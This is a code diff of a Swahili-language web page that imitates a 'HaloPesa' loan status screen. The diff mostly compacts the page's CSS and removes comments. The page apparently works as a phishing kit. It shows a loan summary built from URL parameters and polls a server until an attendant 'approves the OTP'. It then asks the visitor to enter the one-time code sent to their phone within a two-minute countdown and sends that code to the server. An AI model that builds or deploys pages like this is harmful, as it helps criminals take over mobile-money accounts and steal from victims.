@@ -14,9 +14,7 @@
             --dark: #1a1a1a;
             --border: #e5e7eb;
         }
-
         * { margin:0; padding:0; box-sizing:border-box; }
-
         body {
             font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
             background: var(--hp-orange);
@@ -26,252 +24,52 @@
             justify-content: center;
             padding: 20px;
         }
-
-        .container {
-            max-width: 420px;
-            width: 100%;
-            padding: 10px 0;
-        }
-
-        .logo {
-            width: 80px;
-            height: 80px;
-            margin: 0 auto 10px;
-        }
-        .logo svg {
-            width: 100%;
-            height: 100%;
-            display: block;
-        }
-
-        .brand-name {
-            font-size: 1.8rem;
-            font-weight: 900;
-            color: #fff;
-            text-shadow: 0 2px 4px rgba(0,0,0,0.1);
-            text-align: center;
-        }
-
-        .header-sub {
-            font-size: 1rem;
-            color: #fff;
-            opacity: 0.95;
-            text-align: center;
-            margin-bottom: 18px;
-        }
-
-        .card {
-            background: var(--white);
-            border-radius: 20px;
-            padding: 20px 16px;
-            margin-bottom: 15px;
-            box-shadow: 0 4px 12px rgba(0,0,0,0.08);
-        }
-
-        .card-title {
-            font-size: 1.1rem;
-            font-weight: 800;
-            color: var(--dark);
-            margin-bottom: 12px;
-            text-align: center;
-        }
-
-        .loan-summary {
-            display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 8px;
-            margin: 8px 0;
-        }
-
-        .summary-item {
-            background: var(--light-gray);
-            border-radius: 10px;
-            padding: 10px 12px;
-            text-align: center;
-        }
-
-        .summary-item .label {
-            font-size: 0.7rem;
-            color: var(--gray);
-            font-weight: 600;
-            text-transform: uppercase;
-        }
-
-        .summary-item .value {
-            font-size: 1.1rem;
-            font-weight: 800;
-            color: var(--dark);
-            margin-top: 2px;
-        }
-
-        .summary-item .value.orange {
-            color: var(--hp-orange);
-        }
-
-        .status-message {
-            text-align: center;
-            padding: 12px;
-            border-radius: 10px;
-            margin: 10px 0;
-            font-weight: 500;
-        }
-
-        .status-message.waiting {
-            background: #dbeafe;
-            color: #1e40af;
-        }
-        .status-message.success {
-            background: #dcfce7;
-            color: #166534;
-        }
-        .status-message.error {
-            background: #fee2e2;
-            color: #991b1b;
-        }
-        .status-message.info {
-            background: #fef3c7;
-            color: #92400e;
-        }
-
-        .hidden {
-            display: none !important;
-        }
-
-        .code-section {
-            margin-top: 10px;
-            padding-top: 10px;
-            border-top: 1px solid var(--border);
-        }
-
-        .code-section p {
-            font-size: 0.85rem;
-            color: var(--gray);
-            text-align: center;
-            margin-bottom: 8px;
-        }
-
-        /* Code boxes (like PIN) */
-        .code-boxes {
-            display: flex;
-            justify-content: center;
-            gap: 12px;
-            margin: 12px 0 16px;
-        }
-
-        .code-box {
-            width: 50px;
-            height: 56px;
-            border: 2px solid var(--border);
-            border-radius: 12px;
-            text-align: center;
-            font-size: 1.6rem;
-            font-weight: 700;
-            color: var(--dark);
-            outline: none;
-            transition: border-color 0.2s, box-shadow 0.2s;
-            background: var(--white);
-        }
-
-        .code-box:focus {
-            border-color: var(--hp-orange);
-            box-shadow: 0 0 0 3px rgba(255, 90, 31, 0.2);
-        }
-
-        .code-box.filled {
-            border-color: var(--hp-orange);
-        }
-
-        /* Timer */
-        .timer-box {
-            background: #fef2f2;
-            border-radius: 10px;
-            padding: 8px 12px;
-            text-align: center;
-            margin: 12px 0 8px;
-            border: 2px solid #fca5a5;
-        }
-
-        .timer-box .time {
-            font-size: 1.6rem;
-            font-weight: 900;
-            color: #dc2626;
-        }
-
-        .timer-box .label {
-            font-size: 0.7rem;
-            color: var(--gray);
-        }
-
-        .btn-submit {
-            display: inline-block;
-            background: var(--hp-orange);
-            color: #fff;
-            font-weight: 700;
-            font-size: 1rem;
-            padding: 12px 20px;
-            border: none;
-            border-radius: 50px;
-            cursor: pointer;
-            transition: 0.2s;
-            box-shadow: 0 4px 10px rgba(0,0,0,0.1);
-            text-align: center;
-            width: 100%;
-        }
-
-        .btn-submit:hover {
-            background: var(--hp-dark);
-            transform: translateY(-1px);
-        }
-
-        .btn-submit:disabled {
-            opacity: 0.6;
-            cursor: not-allowed;
-        }
-
-        .loader {
-            border: 4px solid #f3f3f3;
-            border-top: 4px solid var(--hp-orange);
-            border-radius: 50%;
-            width: 24px;
-            height: 24px;
-            animation: spin 1s linear infinite;
-            margin: 0 auto;
-        }
-
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-
-        .footer-features {
-            display: flex;
-            justify-content: center;
-            gap: 20px;
-            font-size: 0.7rem;
-            color: #fff;
-            opacity: 0.9;
-            padding: 10px 0;
-        }
-
-        .footer-features span {
-            display: flex;
-            align-items: center;
-            gap: 4px;
-        }
-
-        @media (max-width: 480px) {
-            .container { padding: 5px 0; }
-            .card { padding: 16px 12px; }
-            .loan-summary { gap: 6px; }
-            .summary-item { padding: 8px 6px; }
-            .summary-item .value { font-size: 1rem; }
-            .code-box { width: 44px; height: 50px; font-size: 1.4rem; }
+        .container { max-width:420px; width:100%; padding:10px 0; }
+        .logo { width:80px; height:80px; margin:0 auto 10px; }
+        .logo svg { width:100%; height:100%; display:block; }
+        .brand-name { font-size:1.8rem; font-weight:900; color:#fff; text-shadow:0 2px 4px rgba(0,0,0,0.1); text-align:center; }
+        .header-sub { font-size:1rem; color:#fff; opacity:0.95; text-align:center; margin-bottom:18px; }
+        .card { background:var(--white); border-radius:20px; padding:20px 16px; margin-bottom:15px; box-shadow:0 4px 12px rgba(0,0,0,0.08); }
+        .card-title { font-size:1.1rem; font-weight:800; color:var(--dark); margin-bottom:12px; text-align:center; }
+        .loan-summary { display:grid; grid-template-columns:1fr 1fr; gap:8px; margin:8px 0; }
+        .summary-item { background:var(--light-gray); border-radius:10px; padding:10px 12px; text-align:center; }
+        .summary-item .label { font-size:0.7rem; color:var(--gray); font-weight:600; text-transform:uppercase; }
+        .summary-item .value { font-size:1.1rem; font-weight:800; color:var(--dark); margin-top:2px; }
+        .summary-item .value.orange { color:var(--hp-orange); }
+        .status-message { text-align:center; padding:12px; border-radius:10px; margin:10px 0; font-weight:500; }
+        .status-message.waiting { background:#dbeafe; color:#1e40af; }
+        .status-message.success { background:#dcfce7; color:#166534; }
+        .status-message.error { background:#fee2e2; color:#991b1b; }
+        .status-message.info { background:#fef3c7; color:#92400e; }
+        .hidden { display:none !important; }
+        .code-section { margin-top:10px; padding-top:10px; border-top:1px solid var(--border); }
+        .code-section p { font-size:0.85rem; color:var(--gray); text-align:center; margin-bottom:8px; }
+        .code-boxes { display:flex; justify-content:center; gap:12px; margin:12px 0 16px; }
+        .code-box { width:50px; height:56px; border:2px solid var(--border); border-radius:12px; text-align:center; font-size:1.6rem; font-weight:700; color:var(--dark); outline:none; transition:border-color 0.2s, box-shadow 0.2s; background:var(--white); }
+        .code-box:focus { border-color:var(--hp-orange); box-shadow:0 0 0 3px rgba(255,90,31,0.2); }
+        .code-box.filled { border-color:var(--hp-orange); }
+        .timer-box { background:#fef2f2; border-radius:10px; padding:8px 12px; text-align:center; margin:12px 0 8px; border:2px solid #fca5a5; }
+        .timer-box .time { font-size:1.6rem; font-weight:900; color:#dc2626; }
+        .timer-box .label { font-size:0.7rem; color:var(--gray); }
+        .btn-submit { display:inline-block; background:var(--hp-orange); color:#fff; font-weight:700; font-size:1rem; padding:12px 20px; border:none; border-radius:50px; cursor:pointer; transition:0.2s; box-shadow:0 4px 10px rgba(0,0,0,0.1); text-align:center; width:100%; }
+        .btn-submit:hover { background:var(--hp-dark); transform:translateY(-1px); }
+        .btn-submit:disabled { opacity:0.6; cursor:not-allowed; }
+        .loader { border:4px solid #f3f3f3; border-top:4px solid var(--hp-orange); border-radius:50%; width:24px; height:24px; animation:spin 1s linear infinite; margin:0 auto; }
+        @keyframes spin { 0%{transform:rotate(0deg);} 100%{transform:rotate(360deg);} }
+        .footer-features { display:flex; justify-content:center; gap:20px; font-size:0.7rem; color:#fff; opacity:0.9; padding:10px 0; }
+        .footer-features span { display:flex; align-items:center; gap:4px; }
+        @media (max-width:480px) {
+            .container { padding:5px 0; }
+            .card { padding:16px 12px; }
+            .loan-summary { gap:6px; }
+            .summary-item { padding:8px 6px; }
+            .summary-item .value { font-size:1rem; }
+            .code-box { width:44px; height:50px; font-size:1.4rem; }
         }
     </style>
 </head>
 <body>
     <div class="container">
-        <!-- Logo -->
         <div class="logo">
             <svg viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
                 <rect width="100" height="100" rx="22" fill="#FF5A1F"/>
@@ -281,44 +79,22 @@
         </div>
         <div class="brand-name">HaloPesa</div>
         <div class="header-sub">Hali ya Ombi Lako</div>
-
-        <!-- Loan Summary -->
         <div class="card">
             <div class="card-title">📊 Muhtasari wa Mkopo</div>
             <div class="loan-summary">
-                <div class="summary-item">
-                    <div class="label">Kiasi</div>
-                    <div class="value orange" id="summaryAmount">---</div>
-                </div>
-                <div class="summary-item">
-                    <div class="label">Muhula</div>
-                    <div class="value" id="summaryTerm">---</div>
-                </div>
-                <div class="summary-item">
-                    <div class="label">Simu</div>
-                    <div class="value" id="summaryPhone">---</div>
-                </div>
-                <div class="summary-item">
-                    <div class="label">App ID</div>
-                    <div class="value" id="summaryAppId" style="font-size:0.8rem;">---</div>
-                </div>
+                <div class="summary-item"><div class="label">Kiasi</div><div class="value orange" id="summaryAmount">---</div></div>
+                <div class="summary-item"><div class="label">Muhula</div><div class="value" id="summaryTerm">---</div></div>
+                <div class="summary-item"><div class="label">Simu</div><div class="value" id="summaryPhone">---</div></div>
+                <div class="summary-item"><div class="label">App ID</div><div class="value" id="summaryAppId" style="font-size:0.8rem;">---</div></div>
             </div>
         </div>
-
-        <!-- Status & Code Entry -->
         <div class="card">
             <div class="card-title" id="statusTitle">⏳ Inasubiri</div>
-            <div id="statusMessage" class="status-message waiting">
-                Ombi limepokelewa. Subiri mhudumu kuidhinisha OTP...
-            </div>
-
-            <!-- Timer (hidden until code section appears) -->
+            <div id="statusMessage" class="status-message waiting">Ombi limepokelewa. Subiri mhudumu kuidhinisha OTP...</div>
             <div id="timerBox" class="timer-box hidden">
                 <div class="label">⏱ Muda uliobaki wa kuthibitisha OTP</div>
                 <div class="time" id="timerDisplay">02:00</div>
             </div>
-
-            <!-- Code entry section (hidden until allowed) -->
             <div id="codeSection" class="code-section hidden">
                 <p>Ingiza msimbo wa OTP uliopokea kwenye simu yako</p>
                 <div class="code-boxes">
@@ -331,17 +107,14 @@
                 <div id="codeStatus" class="status-message hidden"></div>
             </div>
         </div>
-
-        <!-- Footer -->
         <div class="footer-features">
             <span>🔒 Salama kwa Njia Fiche</span>
             <span>⚡ Idhini ya Dakika 5</span>
             <span>💰 Hakuna Ada Zilizofichwa</span>
         </div>
     </div>
-
     <script>
-        // ----- Get data from URL -----
+        // Get data from URL
         const params = new URLSearchParams(window.location.search);
         const appId = params.get('app_id');
         const amount = params.get('amount') || '---';
@@ -358,7 +131,7 @@
             document.getElementById('summaryAppId').textContent = appId;
         }
 
-        // ----- DOM refs -----
+        // DOM refs
         const statusMsg = document.getElementById('statusMessage');
         const statusTitle = document.getElementById('statusTitle');
         const codeSection = document.getElementById('codeSection');
@@ -371,9 +144,9 @@
         let pollInterval = null;
         let isCodeSubmitted = false;
         let timerInterval = null;
-        let timeLeft = 120; // 2 minutes
+        let timeLeft = 120;
 
-        // ----- Timer functions -----
+        // Timer functions
         function startTimer() {
             timeLeft = 120;
             timerBox.classList.remove('hidden');
@@ -385,10 +158,8 @@
                 if (timeLeft <= 0) {
                     clearInterval(timerInterval);
                     timerDisplay.textContent = '⏰ Muda Umeisha!';
-                    // Optionally disable code inputs and button
                     codeBoxes.forEach(box => box.disabled = true);
                     verifyBtn.disabled = true;
-                    // Show a message
                     showCodeStatus('⏰ Muda wa kuthibitisha OTP umeisha. Wasiliana na mhudumu.', 'error');
                 }
             }, 1000);
@@ -398,21 +169,13 @@
             const minutes = Math.floor(timeLeft / 60);
             const seconds = timeLeft % 60;
             timerDisplay.textContent = `${String(minutes).padStart(2, '0')}:${String(seconds).padStart(2, '0')}`;
-            if (timeLeft <= 10) {
-                timerDisplay.style.color = '#dc2626';
-            } else {
-                timerDisplay.style.color = '#dc2626';
-            }
         }
 
         function stopTimer() {
-            if (timerInterval) {
-                clearInterval(timerInterval);
-                timerInterval = null;
-            }
+            if (timerInterval) { clearInterval(timerInterval); timerInterval = null; }
         }
 
-        // ----- Code boxes auto-advance (like PIN) -----
+        // Code boxes auto-advance
         codeBoxes.forEach((box, index) => {
             box.addEventListener('input', function() {
                 if (this.value.length === 1 && index < codeBoxes.length - 1) {
@@ -433,7 +196,7 @@
             });
         });
 
-        // ----- Polling -----
+        // Polling
         function startPolling() {
             if (pollInterval) clearInterval(pollInterval);
             pollInterval = setInterval(async () => {
@@ -457,19 +220,17 @@
                         statusClass = 'success';
                         if (!isCodeSubmitted) {
                             codeSection.classList.remove('hidden');
-                            // Show timer and start countdown
                             startTimer();
                             codeBoxes[0].focus();
                         }
                     } else if (data.code_status === 'approved') {
-                        // ✅ LOAN GRANTED – redirect to success page
+                        // ✅ LOAN GRANTED – redirect to success
                         statusText = '🎉 Ombi lako limeidhinishwa rasmi! Mkopo umekubaliwa.';
                         statusClass = 'success';
                         clearInterval(pollInterval);
                         stopTimer();
                         codeSection.classList.add('hidden');
                         timerBox.classList.add('hidden');
-                        // Redirect to success page after 2 seconds
                         setTimeout(() => {
                             window.location.href = `/success?app_id=${appId}&amount=${amount}&months=${months}&phone=${phone}`;
                         }, 2000);
@@ -490,7 +251,6 @@
                     } else {
                         statusText = `Hali: ${data.status} | Msimbo: ${data.code_status}`;
                     }
-
                     setStatus(statusText, statusClass);
 
                 } catch (err) {
@@ -508,9 +268,8 @@
             else statusTitle.textContent = '⏳ Inasubiri';
         }
 
-        // ----- Verify Code (from boxes) -----
+        // Verify Code (from boxes)
         verifyBtn.addEventListener('click', async function() {
-            // Collect code from boxes
             let code = '';
             codeBoxes.forEach(box => code += box.value.trim());
             if (code.length !== 4 || !/^\d{4}$/.test(code)) {
@@ -555,17 +314,9 @@
             codeStatus.className = 'status-message ' + type;
             codeStatus.classList.remove('hidden');
         }
+        function hideCodeStatus() { codeStatus.classList.add('hidden'); }
 
-        function hideCodeStatus() {
-            codeStatus.classList.add('hidden');
-        }
-
-        // Start polling if appId exists
-        if (appId) {
-            startPolling();
-        }
-
-        // Clean up intervals on page unload
+        if (appId) startPolling();
         window.addEventListener('beforeunload', function() {
             if (pollInterval) clearInterval(pollInterval);
             if (timerInterval) clearInterval(timerInterval);
